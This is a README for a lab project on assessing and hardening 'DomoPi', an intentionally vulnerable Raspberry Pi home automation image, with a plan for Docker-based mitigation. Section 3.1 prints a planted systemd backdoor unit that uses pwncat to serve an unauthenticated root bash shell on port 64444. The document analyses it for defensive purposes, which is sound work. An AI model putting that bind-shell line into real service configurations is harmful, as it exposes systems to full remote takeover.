# DomoPi — Embedded Linux Security Hardening

**Security Assessment | Docker Containerization | Container Hardening | Raspberry Pi**

## 1. Project Overview

This project focuses on the security assessment and hardening of **DomoPi**, an intentionally vulnerable Raspberry Pi-based home automation system.

The objective is to identify and analyze existing security weaknesses, demonstrate their potential impact in an isolated laboratory environment, and implement mitigation strategies using **Docker containerization, least-privilege principles, service isolation, and network hardening**.

The original customized Linux kernel is preserved to maintain the security characteristics of the target environment.

## 2. Technical Environment

| Component | Technology |
|---|---|
| Target device | Raspberry Pi |
| Operating system | Raspbian GNU/Linux 12 (Bookworm) |
| Custom kernel | Linux `4.19.118-v8+` |
| Bootloader | U-Boot |
| Custom boot image | `dv-domopi.fit` |
| Host machine | Ubuntu Linux |
| Remote administration | SSH |
| Vulnerable application | Damn Small Vulnerable Webserver (DSVW) |
| Security tools | Nmap, Linux systemd, Docker (planned) |
| Hardening techniques | Container isolation, privilege reduction, firewall configuration |

### Environment Preparation

The original system required an operating system migration to support the tools and functionalities needed for the security hardening activities.

The migration was performed in stages:

```text
Raspbian Buster 10
        |
        v
Raspbian Bullseye 11
        |
        v
Raspbian Bookworm 12
```

Before the migration, a complete SD card backup was created using `dd`.

The migration also involved resolving network connectivity and package management issues, including:

- Configuring Ethernet connectivity between the Ubuntu host and the Raspberry Pi.
- Establishing SSH access through a static IP address (`10.42.0.2`).
- Correcting DNS resolution issues affecting APT repositories.
- Updating the package repositories for Bookworm.
- Preserving the custom U-Boot configuration and vulnerable kernel.

The final environment was verified using:

```bash
cat /etc/os-release
uname -r
```

The system now runs **Raspbian Bookworm 12 with the original Linux 4.19.118-v8+ kernel**.

## 3. Initial Security Assessment

The initial investigation involved examining the provided SD card image (`dv-domopi-student.img`), inspecting the Linux filesystem, identifying active services, and analyzing their security configurations.

The disk partitions were exposed using:

```bash
sudo kpartx -av dv-domopi-student.img
```

The investigation identified several security concerns.

### 3.1 Unauthenticated Root Bind Shell

A persistent backdoor was identified through the `backdoor.service` systemd unit.

**Service configuration:**

```ini
[Service]
Type=simple
ExecStart=pwncat -l -e '/bin/bash' 64444 -k
StandardInput=tty-force
```

The service listens on TCP port `64444` and launches a Bash shell with root privileges.

**Security impact:**

- Unauthenticated remote command execution.
- Potential immediate root-level access.
- Complete compromise of system confidentiality, integrity, and availability.

This is a **bind shell**, because the target listens for incoming connections, rather than initiating a reverse connection.

### 3.2 Vulnerable Web Application

A second service, `dsvw.service`, was identified:

```ini
[Service]
Type=simple
ExecStart=/usr/bin/python3 /home/admin/DSVW/dsvw.py
```

The application listens on TCP port `65412` and runs as `root`.

This creates a significant security risk because successful exploitation of an application-level vulnerability could allow commands to execute with excessive privileges.

### 3.3 Additional Security Concerns

Other areas identified for investigation include:

- Weak or default system credentials.
- Insecure storage of Wi-Fi credentials.
- Excessive privileges assigned to application services.
- Unnecessary network exposure.
- Offline modification of an unencrypted SD card.
- Potential tampering with the home automation application's licensing logic.

These findings will be validated and addressed during the mitigation phase.

## 4. Observed Services

| Service | Port | Status | Security concern |
|---|---|---|---|
| `backdoor.service` | 64444/TCP | Running | Unauthenticated root bind shell |
| `dsvw.service` | 65412/TCP | Running | Vulnerable Python webserver running as root |
| `sshd` | 22/TCP | Running | Remote administration exposure |
| `dnsmasq` | 53/TCP/UDP | Running | DNS service requiring controlled exposure |
| `hostapd` | — | Enabled | Wi-Fi access point; operation to be verified |

Service identification and verification were performed using:

```bash
sudo ss -tulpen
sudo systemctl status backdoor.service dsvw.service
sudo systemctl cat backdoor.service dsvw.service
ps -ww -p 524,525 -o pid,ppid,user,args
```

## 5. Security Hardening Strategy

The mitigation strategy follows a defense-in-depth approach.

**Phase 1 — Security Assessment**
- Identify exposed services and attack surfaces.
- Analyze service privileges and configurations.
- Document reproducible security findings.

**Phase 2 — Docker Containerization**
- Containerize the DSVW Python application.
- Separate the application from the host environment.
- Verify Docker compatibility with the custom kernel.

**Phase 3 — Container and Host Hardening**
- Run the application as a non-root user.
- Restrict Linux capabilities and privilege escalation.
- Limit filesystem access and container resources.
- Apply network filtering and service minimization.
- Disable the unauthorized backdoor in the hardened configuration.

**Phase 4 — Security Validation**
- Compare exposed services before and after mitigation.
- Verify privilege restrictions.
- Evaluate whether exploitation impact has been reduced.
- Ensure legitimate application functionality remains available.

/* ## 6. Repository Structure

/* ```text
/* domopi-security-hardening/
/*├── README.md
/* ├── docs/
/* │   ├── 01-initial-assessment.md
/* │   ├── 02-environment-setup.md
/* │   ├── 03-mitigations.md
/* │   └── 04-validation.md
/* ├── docker/
/* ├── screenshots/
/* └── .gitignore
/* ``` 


## 6. Disclaimer

This project is conducted in an **isolated, authorized educational laboratory** using an intentionally vulnerable system.

All security assessments and exploitation demonstrations are intended exclusively for learning, vulnerability analysis, and defensive security research.

---

**Focus:** Embedded Linux Security · IoT Security · Docker Security · System Hardening
